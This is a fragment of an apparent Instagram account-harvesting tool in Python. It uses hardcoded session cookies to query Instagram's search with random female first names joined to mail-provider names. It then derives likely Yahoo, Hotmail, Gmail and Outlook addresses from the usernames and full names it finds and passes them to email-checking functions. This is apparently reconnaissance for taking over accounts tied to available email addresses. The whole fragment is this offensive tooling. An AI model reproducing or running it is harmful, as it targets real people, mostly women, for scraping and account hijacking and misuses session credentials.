	  get = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}@{cc}',headers = head).json()
	  se=0
	  try:
	   while True:
	    se += 1
	    user = str(get['users'][se]['user']['username'])
	    if cc in user:
	      emai = user.split(cc)[0]
	      email = emai+'@'+cc+".com"
	      if "sg" in email or "br" in email or "ar" in email or "hk" in email or "au" in email or "ph" in email or "mx" in email or "tw" in email:pass
	      else:yahoo(email,user)
	    else:
	      email=str(get['users'][se]['user']['full_name'])
	      if ' ' in email:
	      	pass
	      else:
	        if "sg" in email or "br" in email or "ar" in email or "hk" in email or "au" in email or "ph" in email or "mx" in email or "tw" in email:pass
	        else:yahoo(email,user)
	  except IndexError:
	  	pass

	  		  		  	
	  		  		  		  		  		  	
	  		  		  		  		  		  		  		  		  	
	  		  		  		  		  		  		  		  		  		  		  		  	
	  		  		  		  		  		  		  		  		  		  		  		  		  		  		  	
	  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  	
	  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  		  	
 if Tools == str("2"):
	 cc="hotmail"
	 head= {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+ss}
	 while True:
	  name = names.get_first_name(gender='femal')
	  get = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}@{cc}',headers = head).json()
	  se=0
	  try:
	   while True:
	    se += 1
	    user = str(get['users'][se]['user']['username'])
	    if cc in user:
	      emai = user.split(cc)[0]
	      email = emai+'@'+cc+".com"
	      if "sg" in email or "br" in email or "ar" in email or "hk" in email or "au" in email or "ph" in email or "es" in email or "fr" in email:pass
	      else:hotmail(email,user)
	    else:
	      email=str(get['users'][se]['user']['full_name'])
	      if ' ' in email:
	      	pass
	      else:
	        if "sg" in email or "br" in email or "ar" in email or "hk" in email or "au" in email or "ph" in email or "mx" in email or "tw" in email:pass
	        else:hotmail(email,user)
	  except IndexError:
	  	pass

	  	
	  		  	
	  		  		  	
	  		  		  		  		  	
 if Tools == str("3"):
	 cc="gmail"
	 head= {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+ss}
	 while True:
	  name = names.get_first_name(gender='femal')
	  get = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}@{cc}',headers = head).json()
	  se=0
	  try:
	   while True:
	    se += 1
	    user = str(get['users'][se]['user']['username'])
	    if cc in user:
	      emai = user.split(cc)[0]
	      email = emai+'@'+cc+".com"
	      if "sg" in email or "br" in email or "ar" in email or "hk" in email or "au" in email or "ph" in email or "mx" in email or "tw" in email:pass
	      else:def_gmail(email,user)
	    else:
	      email=str(get['users'][se]['user']['full_name'])
	      if ' ' in email:
	      	pass
	      else:
	        if "sg" in email or "br" in email or "ar" in email or "hk" in email or "au" in email or "ph" in email or "mx" in email or "tw" in email:pass
	        else:def_gmail(email,user)
	  except IndexError:
	  	pass













		  		 
	  		  		 	  		  		 	  		  		 
 if Tools == str("4"):
	 cc="Outlook"
	 head= {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+ss}
	 while True:
	  name = names.get_first_name(gender='femal')
	  get = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}@{cc}',headers = head).json()
	  se=0
	  try:
	   while True:
	    se += 1
	    user = str(get['users'][se]['user']['username'])
	    if cc in user:
	      emai = user.split(cc)[0]
	      email = emai+'@'+cc+".com"
	      if "es" in email or "br" in email or "ar" in email or "hk" in email or "fr" in email or "ph" in email or "mx" in email or "tw" in email:pass
	      else:hotmail(email,user)
	    else:
	      email=str(get['users'][se]['user']['full_name'])
	      if ' ' in email:
	      	pass
#	      	emai=email.replace(" ","")
#	      	email=emai+'@'+cc+".com"
#	      	Aol(email,user)
	      else:
	        if "fr" in email or "br" in email or "ar" in email or "hk" in email or "es" in email or "ph" in email or "mx" in email or "tw" in email:pass
	        else:hotmail(email,user)
	  except IndexError:
	  	pass













	  		  		  
 if Tools == str("5"):
	 cc="Outlook"
	 head= {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+ss}
	 while True:
	  name = names.get_first_name(gender='femal')
	  get = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}@{cc}',headers = head).json()
	  se=0
	  try:
	   while True:
	    se += 1
	    user = str(get['users'][se]['user']['username'])
	    if cc in user:
	      emai = user.split(cc)[0]
	      email = emai+'@'+cc+".sa"
	      if "con" in email or "br" in email or "ar" in email or "hk" in email or "au" in email or "ph" in email or "fr" in email or "es" in email:pass
	      else:hotmail(email,user)
	    else:
	      ee=str(get['users'][se]['user']['full_name'])
	      emai=ee.replace('.com','')
	      email=emai+".sa"
	      if ' ' in email:
	      	pass
	      else:
	        if "sg" in email or "con" in email or "ar" in email or "br" in email or "au" in email or "ph" in email or "fr" in email or "es" in email:pass
	        else:
	        	hotmail(email,user)
	  except IndexError:
	  	pass	  		  		  	 		  		  			  	 	












	  	
def START():
	os.system('clear');AloshToolss()
	print(A+" ---------------------------") 
	print(F+"("+C+"1"+F+") "+F+"START CHECK INSTAGRAM")
	print(F+"("+C+"2"+F+") "+C+"GET EMAIL")
	print(A+" ---------------------------")
	tools = input(F+"("+C+"⌯"+F+") "+C+" CHOOSE  "+Z+" : "+F)
								
	if str(tools) in ["1", "01"]:START_INSTAGRAM()
	if str(tools) in ["2", "02"]:choice()
	else:START()
START()
